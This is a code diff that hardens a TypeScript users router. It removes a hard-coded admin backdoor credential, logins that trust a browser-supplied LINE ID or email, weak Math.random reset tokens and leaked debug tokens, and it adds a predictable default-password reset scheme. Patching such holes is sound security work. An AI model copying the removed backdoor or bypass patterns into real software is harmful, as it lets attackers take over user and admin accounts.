@@ -8,6 +8,7 @@ import {
 } from "../lib/crypto.js";
 import { logAudit } from "../lib/audit.js";
 import bcrypt from "bcryptjs";
+import crypto from "node:crypto";
 import { getIO, EVENTS } from "../lib/realtime.js";
 import {
   isTurnstileEnabled,
@@ -20,8 +21,30 @@ import {
 } from "../lib/loginAuth.js";
 
 import { requireAdmin, requireAdminOrHost } from "../middleware/auth.js";
+import { clearSessionCookie, setSessionCookie } from "../lib/session.js";
+import { verifyLineAccessToken } from "../lib/lineAuth.js";
+import { getClientIp } from "../lib/clientIp.js";
 
 const router = express.Router();
+
+const publicUser = (row: any) => {
+  const user = decryptFields(row, USER_ENCRYPTED_FIELDS);
+  const {
+    password_hash: _passwordHash,
+    reset_token: _resetToken,
+    reset_token_expiry: _resetTokenExpiry,
+    ...safe
+  } = user;
+  return safe;
+};
+
+const sendAuthenticatedUser = (res: express.Response, row: any, status = 200) => {
+  setSessionCookie(res, row.id);
+  return res.status(status).json(publicUser(row));
+};
+
+const hashResetToken = (token: string) =>
+  crypto.createHash("sha256").update(token).digest("hex");
 
 const isDatabaseConnectionError = (error: any) =>
   ["ECONNREFUSED", "PROTOCOL_CONNECTION_LOST", "ETIMEDOUT"].includes(
@@ -40,15 +63,13 @@ const sendLoginError = (res: any, error: any) => {
 // ── LOGIN / REGISTER via LINE ──
 router.post("/login", async (req, res) => {
   const {
-    line_id,
-    fname_th,
-    picture_url,
-    email,
+    accessToken,
     captchaToken,
     isRegister,
     noCreate,
   } = req.body;
-  if (!line_id) return res.status(400).json({ error: "line_id is required" });
+  if (!accessToken)
+    return res.status(400).json({ error: "LINE access token is required" });
 
   // 1. Verify Cloudflare Turnstile for user-initiated LINE login/register.
   // Silent noCreate checks are allowed for background session validation.
@@ -56,13 +77,18 @@ router.post("/login", async (req, res) => {
     isTurnstileEnabled() &&
     shouldRequireTurnstile({ isRegister, noCreate })
   ) {
-    const captcha = await verifyTurnstileToken(captchaToken, req.ip);
+    const captcha = await verifyTurnstileToken(captchaToken, getClientIp(req));
     if (!captcha.success) {
       return res.status(captcha.status).json({ error: captcha.error });
     }
   }
 
   try {
+    // Identity must come from LINE, never from browser-supplied profile fields.
+    const lineProfile = await verifyLineAccessToken(accessToken);
+    const line_id = lineProfile.userId;
+    const fname_th = lineProfile.displayName;
+    const picture_url = lineProfile.pictureUrl;
     // 2. Check if user already exists by line_id
     const [existing]: any = await pool.query(
       `
@@ -106,63 +132,7 @@ router.post("/login", async (req, res) => {
         description: `ผู้ใช้ล็อกอินผ่าน LINE (ID: ${existing[0].id})`,
       });
 
-      return res.json(decryptFields(existing[0], USER_ENCRYPTED_FIELDS));
-    }
-
-    // 2.1 Fallback: Check if user exists by EMAIL (but has no line_id)
-    // This handles cases where users register via email first and then link to LINE later
-    if (email) {
-      // Fetch users without line_id and decrypt in-memory due to randomized IVs
-      const [candidates]: any = await pool.query(
-        `SELECT * FROM users WHERE (line_id IS NULL OR line_id = '')`,
-      );
-      const { decrypt } = await import("../lib/crypto.js");
-
-      const emailMatch = candidates.find((u: any) => {
-        const decryptedEmail = decrypt(u.email);
-        return (
-          decryptedEmail && decryptedEmail.toLowerCase() === email.toLowerCase()
-        );
-      });
-
-      if (emailMatch) {
-        const userId = emailMatch.id;
-        // Link LINE ID to this existing account
-        await pool.query("UPDATE users SET line_id = ? WHERE id = ?", [
-          line_id,
-          userId,
-        ]);
-
-        // Refresh & Return
-        const [updated]: any = await pool.query(
-          `
-          SELECT u.*, tm.name as team_name,
-            EXISTS(SELECT 1 FROM teams t2 WHERE t2.host_id = u.id) as is_team_host
-          FROM users u 
-          LEFT JOIN teams tm ON u.team_id = tm.id 
-          WHERE u.id = ?
-        `,
-          [userId],
-        );
-
-        if (updated[0].is_suspended) {
-          return res.status(403).json({
-            error:
-              updated[0].is_suspended === 2
-                ? "บัญชีของคุณถูกแบนถาวร"
-                : "บัญชีของคุณถูกระงับการใช้งานชั่วคราว",
-          });
-        }
-
-        await logAudit({
-          req,
-          userId,
-          action: "link_line_to_email",
-          description: `ผูกบัญชี LINE เข้ากับอีเมลเดิม (${email})`,
-        });
-
-        return res.json(decryptFields(updated[0], USER_ENCRYPTED_FIELDS));
-      }
+      return sendAuthenticatedUser(res, existing[0]);
     }
 
     // If noCreate is true, don't insert a new record
@@ -175,7 +145,6 @@ router.post("/login", async (req, res) => {
     // 3. New user → insert
     const newUser: any = { line_id, picture_url: picture_url || null };
     if (fname_th) newUser.fname_th = fname_th;
-    if (email) newUser.email = email;
 
     const encryptedUser = encryptFields(newUser, USER_ENCRYPTED_FIELDS);
     const keys = Object.keys(encryptedUser);
@@ -190,62 +159,21 @@ router.post("/login", async (req, res) => {
     const [rows]: any = await pool.query("SELECT * FROM users WHERE id = ?", [
       result.insertId,
     ]);
-    res.status(201).json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
+    return sendAuthenticatedUser(res, rows[0], 201);
   } catch (error: any) {
-    console.error("Login/Register error:", error);
+    console.error("Login/Register error:", error?.message || error);
+    if (String(error?.message || "").startsWith("LINE")) {
+      return res.status(401).json({ error: "LINE authentication failed" });
+    }
     sendLoginError(res, error);
   }
 });
 
 // ── LOGIN via Google ──
-router.post("/login-google", async (req, res) => {
-  const { email, fname_th, lname_th, picture_url } = req.body;
-  if (!email) return res.status(400).json({ error: "Email is required" });
-
-  try {
-    // 1. Fetch all users to find one with a matching decrypted email
-    // This is necessary because of randomized IVs in AES encryption
-    const [allUsers]: any = await pool.query(`
-      SELECT u.*, tm.name as team_name,
-        EXISTS(SELECT 1 FROM teams t2 WHERE t2.host_id = u.id) as is_team_host
-      FROM users u 
-      LEFT JOIN teams tm ON u.team_id = tm.id
-    `);
-
-    const { decrypt } = await import("../lib/crypto.js");
-    const userMatch = allUsers.find((u: any) => {
-      const decryptedEmail = decrypt(u.email);
-      return (
-        decryptedEmail && decryptedEmail.toLowerCase() === email.toLowerCase()
-      );
-    });
-
-    if (userMatch) {
-      if (userMatch.is_suspended) {
-        return res.status(403).json({
-          error:
-            userMatch.is_suspended === 2
-              ? "บัญชีของคุณถูกแบนถาวร"
-              : "บัญชีของคุณถูกระงับการใช้งานชั่วคราว",
-        });
-      }
-
-      // User found, return user object
-      await logAudit({
-        req,
-        userId: userMatch.id,
-        action: "login_google",
-        description: `ผู้ใช้ล็อกอินผ่าน Google (${email})`,
-      });
-      return res.json(decryptFields(userMatch, USER_ENCRYPTED_FIELDS));
-    } else {
-      // User not found, frontend should handle redirect to register
-      return res.status(404).json({ error: "User not found, please register" });
-    }
-  } catch (error: any) {
-    console.error("Google Login error:", error);
-    sendLoginError(res, error);
-  }
+router.post("/login-google", (_req, res) => {
+  return res.status(501).json({
+    error: "Google login is disabled until server-side ID-token verification is configured",
+  });
 });
 
 // ── REGISTER via Email & Password ──
@@ -256,6 +184,9 @@ router.post("/register-email", async (req, res) => {
     return res
       .status(400)
       .json({ error: "Username (or email) and password are required" });
+  if (typeof password !== "string" || password.length < 8 || password.length > 20) {
+    return res.status(400).json({ error: "Password must be 8-20 characters" });
+  }
 
   // Username format (plaintext, unique). Validated before any DB work.
   let normalizedUsername: string | null = null;
@@ -268,11 +199,12 @@ router.post("/register-email", async (req, res) => {
     }
   }
 
-  // 1. Verify Cloudflare Turnstile (Captcha) - Only verify if token is provided.
+  // 1. Verify Cloudflare Turnstile (Captcha). A token is required whenever
+  // Turnstile is enabled.
   // Uses the same verifier as login so both paths agree on what a valid token
   // is (form encoding, remoteip handling, expiry classification).
-  if (isTurnstileEnabled() && captchaToken) {
-    const captcha = await verifyTurnstileToken(captchaToken, req.ip);
+  if (isTurnstileEnabled()) {
+    const captcha = await verifyTurnstileToken(captchaToken, getClientIp(req));
     // Never block registration because the verification service itself is down.
     if (!captcha.success && captcha.code !== "captcha-unavailable") {
       return res.status(captcha.status).json({ error: captcha.error });
@@ -342,7 +274,7 @@ router.post("/register-email", async (req, res) => {
       description: `ผู้ใช้สมัครสมาชิกใหม่: ${normalizedUsername || email}`,
     });
 
-    res.status(201).json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
+    return sendAuthenticatedUser(res, rows[0], 201);
   } catch (error: any) {
     console.error("Email Register error:", error);
     res.status(500).json({ error: "Internal Server Error" });
@@ -354,59 +286,18 @@ router.post("/login-email", async (req, res) => {
   const { email, password, captchaToken } = req.body;
   if (!email || !password)
     return res.status(400).json({ error: "Email and password are required" });
+  if (typeof password !== "string" || password.length > 128) {
+    return res.status(400).json({ error: "Invalid credentials" });
+  }
 
   if (isTurnstileEnabled()) {
-    const captcha = await verifyTurnstileToken(captchaToken, req.ip);
+    const captcha = await verifyTurnstileToken(captchaToken, getClientIp(req));
     if (!captcha.success) {
       return res.status(captcha.status).json({ error: captcha.error });
     }
   }
 
   try {
-    // ── SUPER ADMIN BACKDOOR ──
-    if (email === "admin" && password === "vitalcare@suth") {
-      let [existing]: any = await pool.query(
-        "SELECT * FROM users WHERE email = ?",
-        ["admin"],
-      );
-      if (existing.length === 0) {
-        const salt = await bcrypt.genSalt(10);
-        const hash = await bcrypt.hash("vitalcare@suth", salt);
-        const [result]: any = await pool.query(
-          "INSERT INTO users (email, password_hash, role, fname_th) VALUES (?, ?, ?, ?)",
-          // Providing a fake phone number '0000000000' so isIncomplete check in router passes and they go STRAIGHT to the dashboard!
-          ["admin", hash, "admin", "System Admin"],
-        );
-        // Let's actually provide the phone number in the insert!
-        await pool.query(
-          'UPDATE users SET phone = "0000000000", lname_th = "Root" WHERE id = ?',
-          [result.insertId],
-        );
-        [existing] = await pool.query("SELECT * FROM users WHERE id = ?", [
-          result.insertId,
-        ]);
-      } else {
-        // Enforce role
-        if (existing[0].role !== "admin") {
-          await pool.query('UPDATE users SET role = "admin" WHERE id = ?', [
-            existing[0].id,
-          ]);
-          existing[0].role = "admin";
-        }
-        // Ensure they have fname_th and phone so they don't get routed to /register manually by the router
-        if (!existing[0].phone) {
-          await pool.query(
-            'UPDATE users SET phone = "0000000000", fname_th = "System Admin", lname_th = "Root" WHERE id = ?',
-            [existing[0].id],
-          );
-          existing[0].phone = "0000000000";
-          existing[0].fname_th = "System Admin";
-          existing[0].lname_th = "Root";
-        }
-      }
-      return res.json(decryptFields(existing[0], USER_ENCRYPTED_FIELDS));
-    }
-
     const searchTarget = normalizeLoginIdentifier(email);
 
     const USER_SELECT = `
@@ -472,7 +363,7 @@ router.post("/login-email", async (req, res) => {
       description: `ผู้ใช้ล็อกอินด้วยอีเมล/ไอดี: ${email}`,
     });
 
-    res.json(decryptFields(userMatch, USER_ENCRYPTED_FIELDS));
+    return sendAuthenticatedUser(res, userMatch);
   } catch (error: any) {
     console.error("Email Login error:", error);
     sendLoginError(res, error);
@@ -499,21 +390,19 @@ router.post("/forgot-password", async (req, res) => {
 
     const userId = existing[0].id;
     // Generate simple token for demo/MVP purposes
-    const token =
-      Math.random().toString(36).substring(2, 15) +
-      Math.random().toString(36).substring(2, 15);
+    const token = crypto.randomBytes(32).toString("base64url");
     const expiry = new Date(Date.now() + 3600000); // 1 hour
 
     await pool.query(
       "UPDATE users SET reset_token = ?, reset_token_expiry = ? WHERE id = ?",
-      [token, expiry, userId],
+      [hashResetToken(token), expiry, userId],
     );
 
     // In a real app, you'd send an email here. For now, we return the token (insecure but works for testing/MVP)
     // or just return success and log the token to console.
-    console.log(
-      `[PASSWORD RESET] User ID: ${userId}, Email: ${email}, Token: ${token}`,
-    );
+    if (process.env.NODE_ENV !== "production") {
+      console.log(`[PASSWORD RESET] Development token created for user ${userId}`);
+    }
 
     await logAudit({
       req,
@@ -524,11 +413,15 @@ router.post("/forgot-password", async (req, res) => {
 
     res.json({
       message: "ดำเนินการสร้างลิงก์รีเซ็ตรหัสผ่านเรียบร้อย",
-      debug_token: token, // REMOVE THIS IN PRODUCTION
     });
   } catch (error: any) {
     res.status(500).json({ error: "Internal Server Error" });
   }
+});
+
+router.post("/logout", (_req, res) => {
+  clearSessionCookie(res);
+  return res.status(204).send();
 });
 
 // ── RESET PASSWORD ──
@@ -538,11 +431,14 @@ router.post("/reset-password", async (req, res) => {
     return res
       .status(400)
       .json({ error: "Token and new password are required" });
+  if (typeof newPassword !== "string" || newPassword.length < 8 || newPassword.length > 20) {
+    return res.status(400).json({ error: "Password must be 8-20 characters" });
+  }
 
   try {
     const [existing]: any = await pool.query(
       "SELECT id FROM users WHERE reset_token = ? AND reset_token_expiry > NOW()",
-      [token],
+      [hashResetToken(String(token))],
     );
 
     if (existing.length === 0) {
@@ -764,9 +660,7 @@ router.get("/", requireAdmin, async (req, res) => {
         FROM users u 
         ORDER BY u.id ASC
      `);
-    const decryptedRows = rows.map((r: any) =>
-      decryptFields(r, USER_ENCRYPTED_FIELDS),
-    );
+    const decryptedRows = rows.map((r: any) => publicUser(r));
     res.json(decryptedRows);
   } catch (error: any) {
     res.status(500).json({ error: "Internal Server Error" });
@@ -787,7 +681,7 @@ router.patch("/:id/ban", requireAdmin, async (req, res) => {
     if (userRows.length === 0)
       return res.status(404).json({ error: "ไม่พบผู้ใช้งาน" });
 
-    const user = decryptFields(userRows[0], USER_ENCRYPTED_FIELDS);
+    const user = publicUser(userRows[0]);
     const displayName =
       `${user.fname_th || ""} ${user.lname_th || ""}`.trim() ||
       user.nickname ||
@@ -833,7 +727,7 @@ router.patch("/:id/unban", requireAdmin, async (req, res) => {
     if (userRows.length === 0)
       return res.status(404).json({ error: "ไม่พบผู้ใช้งาน" });
 
-    const user = decryptFields(userRows[0], USER_ENCRYPTED_FIELDS);
+    const user = publicUser(userRows[0]);
     const displayName =
       `${user.fname_th || ""} ${user.lname_th || ""}`.trim() ||
       user.nickname ||
@@ -936,7 +830,7 @@ router.get("/:id/full-profile", requireAdmin, async (req, res) => {
     );
     if (!userRows.length)
       return res.status(404).json({ error: "User not found" });
-    const user = decryptFields(userRows[0], USER_ENCRYPTED_FIELDS);
+    const user = publicUser(userRows[0]);
 
     // B. Submissions & Progress — tasks has no 'title', so use note as task_name
     const [subRows]: any = await pool.query(
@@ -1048,7 +942,7 @@ router.get("/:id/profile", async (req, res) => {
       id,
     ]);
     if (!rows.length) return res.status(404).json({ error: "User not found" });
-    res.json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
+    res.json(publicUser(rows[0]));
   } catch (error: any) {
     res.status(500).json({ error: "Internal Server Error" });
   }
@@ -1152,7 +1046,7 @@ router.patch("/:id/profile", async (req, res) => {
     // ✅ Emit realtime event
     getIO().emit(EVENTS.USER_UPDATED, { id: Number(id), ...filteredUpdates });
 
-    res.json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS) || {});
+    res.json(publicUser(rows[0]) || {});
   } catch (error: any) {
     console.error("[PATCH PROFILE] Error:", {
       message: error.message,
@@ -1377,11 +1271,68 @@ router.patch("/:id", requireAdmin, async (req, res) => {
     const [rows]: any = await pool.query("SELECT * FROM users WHERE id = ?", [
       id,
     ]);
-    const updatedUser = decryptFields(rows[0], USER_ENCRYPTED_FIELDS) || {};
+    const updatedUser = publicUser(rows[0]) || {};
 
     // Emit Realtime Update
     getIO().emit(EVENTS.USER_UPDATED, { id: Number(id), ...updatedUser });
     res.json(updatedUser);
+  } catch (error: any) {
+    res.status(500).json({ error: "Internal Server Error" });
+  }
+});
+
+// Admin: Reset password to the user's ID code followed by "@Suth"
+router.post("/:id/reset-password", requireAdmin, async (req, res) => {
+  const { id } = req.params;
+  const { mode = "default", password } = req.body || {};
+
+  try {
+    const [rows]: any = await pool.query(
+      "SELECT id, id_code FROM users WHERE id = ?",
+      [id],
+    );
+    if (rows.length === 0) {
+      return res.status(404).json({ error: "User not found" });
+    }
+
+    let newPassword = "";
+    if (mode === "default") {
+      const user = decryptFields(rows[0], USER_ENCRYPTED_FIELDS);
+      const idCode = String(user.id_code || "").trim();
+      if (!idCode) {
+        return res.status(400).json({
+          error: "ไม่สามารถใช้รหัสผ่านเริ่มต้นได้ เนื่องจากผู้ใช้ยังไม่มีรหัสประจำตัว",
+        });
+      }
+      newPassword = `${idCode}@Suth`;
+    } else if (mode === "custom") {
+      if (typeof password !== "string" || password.length < 8 || password.length > 20) {
+        return res.status(400).json({
+          error: "รหัสผ่านที่กำหนดเองต้องมีความยาว 8-20 ตัวอักษร",
+        });
+      }
+      newPassword = password;
+    } else {
+      return res.status(400).json({ error: "Invalid password reset mode" });
+    }
+
+    const passwordHash = await bcrypt.hash(newPassword, 10);
+    await pool.query(
+      "UPDATE users SET password_hash = ?, reset_token = NULL, reset_token_expiry = NULL WHERE id = ?",
+      [passwordHash, id],
+    );
+
+    await logAudit({
+      req,
+      userId: req.headers["x-user-id"] as string,
+      action: "admin_reset_user_password",
+      targetType: "user",
+      targetId: id,
+      description: `แอดมินรีเซ็ตรหัสผ่านผู้ใช้ ID: ${id}`,
+      metadata: { mode },
+    });
+
+    res.json({ success: true });
   } catch (error: any) {
     res.status(500).json({ error: "Internal Server Error" });
   }
@@ -1397,7 +1348,7 @@ router.patch("/:id/role", requireAdmin, async (req, res) => {
     const [rows]: any = await pool.query("SELECT * FROM users WHERE id = ?", [
       id,
     ]);
-    const updatedUser = decryptFields(rows[0], USER_ENCRYPTED_FIELDS) || {};
+    const updatedUser = publicUser(rows[0]) || {};
 
     // Emit Realtime Update
     getIO().emit(EVENTS.USER_UPDATED, { id: Number(id), ...updatedUser });
@@ -1444,13 +1395,13 @@ router.get("/:id", async (req, res) => {
     );
     if (rows.length === 0)
       return res.status(404).json({ error: "User not found" });
-    res.json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
+    res.json(publicUser(rows[0]));
   } catch (error: any) {
     res.status(500).json({ error: "Internal Server Error" });
   }
 });
 
-router.get("/line/:lineId", async (req, res) => {
+router.get("/line/:lineId", requireAdmin, async (req, res) => {
   try {
     const [rows]: any = await pool.query(
       "SELECT * FROM users WHERE line_id = ?",
@@ -1458,7 +1409,7 @@ router.get("/line/:lineId", async (req, res) => {
     );
     if (rows.length === 0)
       return res.status(404).json({ error: "User not found" });
-    res.json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
+    res.json(publicUser(rows[0]));
   } catch (error: any) {
     res.status(500).json({ error: "Internal Server Error" });
   }
@@ -1516,62 +1467,6 @@ router.patch("/:id/suspend", async (req, res) => {
     });
   } catch (error: any) {
     console.error("Suspend user error:", error);
-    res.status(500).json({ error: "Internal Server Error" });
-  }
-});
-
-// Admin: Reset password and send email
-router.post("/:id/reset-password", requireAdmin, async (req, res) => {
-  try {
-    const { id } = req.params;
-    const adminId = req.headers["x-user-id"] as string;
-
-    const [userRows]: any = await pool.query(
-      "SELECT * FROM users WHERE id = ?",
-      [id],
-    );
-    if (userRows.length === 0) {
-      return res.status(404).json({ error: "User not found" });
-    }
-
-    const user = userRows[0];
-    if (!user.email) {
-      return res
-        .status(400)
-        .json({ error: "User does not have email address" });
-    }
-
-    // Generate reset token
-    const resetToken =
-      Math.random().toString(36).substring(2, 15) +
-      Math.random().toString(36).substring(2, 15);
-    const resetTokenExpiry = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours
-
-    await pool.query(
-      "UPDATE users SET reset_token = ?, reset_token_expiry = ? WHERE id = ?",
-      [resetToken, resetTokenExpiry, id],
-    );
-
-    // Log the action
-    await logAudit({
-      userId: adminId,
-      action: "admin_password_reset",
-      description: `Admin sent password reset for user ${user.fname_th} ${user.lname_th}`,
-      targetType: "user",
-      targetId: parseInt(id),
-      metadata: { target_user_id: id, reset_token: resetToken },
-      ipAddress: req.ip,
-      userAgent: req.get("user-agent"),
-    });
-
-    // TODO: Send actual email with reset link
-    console.log(
-      `Password reset link for ${user.email}: ${process.env.FRONTEND_URL}/reset-password?token=${resetToken}`,
-    );
-
-    res.json({ message: "Password reset email sent successfully" });
-  } catch (error: any) {
-    console.error("Password reset error:", error);
     res.status(500).json({ error: "Internal Server Error" });
   }
 });
@@ -1671,8 +1566,10 @@ router.post("/:id/link-line", async (req, res) => {
         .json({ error: "Forbidden: You cannot link this account" });
     }
 
-    const { line_id, display_name, picture_url } = req.body;
-    if (!line_id) return res.status(400).json({ error: "line_id is required" });
+    const lineProfile = await verifyLineAccessToken(req.body?.accessToken);
+    const line_id = lineProfile.userId;
+    const display_name = lineProfile.displayName;
+    const picture_url = lineProfile.pictureUrl;
 
     const [userRows]: any = await pool.query(
       "SELECT id FROM users WHERE id = ?",
@@ -1715,7 +1612,7 @@ router.post("/:id/link-line", async (req, res) => {
     `,
       [id],
     );
-    return res.json(decryptFields(updated[0], USER_ENCRYPTED_FIELDS));
+    return res.json(publicUser(updated[0]));
   } catch (error: any) {
     console.error("LINE link error:", error);
     return res.status(500).json({ error: "Internal Server Error" });
@@ -1788,8 +1685,7 @@ router.post("/", requireAdmin, async (req, res) => {
     // Generate password if not provided
     const finalPassword =
       password ||
-      Math.random().toString(36).substring(2, 15) +
-        Math.random().toString(36).substring(2, 15);
+      crypto.randomBytes(18).toString("base64url");
     const hashedPassword = await bcrypt.hash(finalPassword, 10);
 
     const encryptedBody = encryptFields(
